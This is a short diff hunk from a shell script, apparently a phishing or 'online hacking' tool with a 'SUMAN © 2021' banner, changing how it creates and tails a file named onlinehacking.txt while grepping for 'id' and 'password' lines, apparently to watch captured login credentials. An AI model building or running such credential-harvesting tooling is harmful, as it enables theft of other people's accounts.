@@ -366,7 +366,8 @@ ash1() {
 			   echo 
 			   echo -e "\e[96m========================\e[92m    SUMAN © 2021    \e[96m========================= \e[92m"
                            echo 
-                           tail -f OnlineHacking.txt | grep -e "id" -e "password"      
+			   touch onlinehacking.txt >> /dev/null 2>&1
+                           tail -f onlinehacking.txt | grep -e "id" -e "password"      
 
                            break;
 
